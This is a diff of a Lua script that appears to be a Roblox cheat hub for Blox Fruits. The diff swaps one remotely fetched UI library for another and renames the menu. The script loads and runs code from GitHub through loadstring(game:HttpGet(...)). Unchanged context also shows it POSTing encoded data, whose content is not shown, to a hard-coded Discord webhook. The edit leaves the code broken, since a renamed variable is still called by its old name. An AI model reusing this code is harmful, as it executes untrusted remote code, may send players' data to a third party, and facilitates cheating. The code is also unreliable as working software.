@@ -1,18 +1,12 @@
-local WindUI = (loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua")))();
-local Window = WindUI:CreateWindow({
-	Title = "Vortex Hub",
-	Author = "Blox Fruit",
-	Folder = "Made By Velaric",
-	Size = UDim2.fromOffset(520, 300),
-	Transparent = true,
-	Theme = "Dark",
-	SideBarWidth = 190,
-	HasOutline = false,
+local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/daucobonhi/UiRedzV5/refs/heads/main/DemoUi.lua"))();
+local Windows = redzlib:MakeWindow({
+Title = "Anura Gaming",
+    SubTitle = "Youtuber Top 1",
+    SaveFolder = "Blox Fruits.lua"
 });
-Window:EditOpenButton({
-	Title = "Yuongzmin trash",
-	CornerRadius = UDim.new(0, 10),
-	Draggable = false
+Windows:AddMinimizeButton({
+  Button = { Image = "rbxassetid://131151731604309", BackgroundTransparency = 0 },
+  Corner = { CornerRadius = UDim.new(0, 6) }
 });
 local Tabs = {
     InfoTab = Window:Tab({
@@ -10008,4 +10002,5 @@ local WebhookURL = "https://discord.com/api/webhooks/1361944409662423180/cliAsM5
 local Request = http_request or request or HttpPost or syn.request
 if Request then
     Request({Url = WebhookURL, Body = Encoded, Method = "POST", Headers = Headers})
+
 end
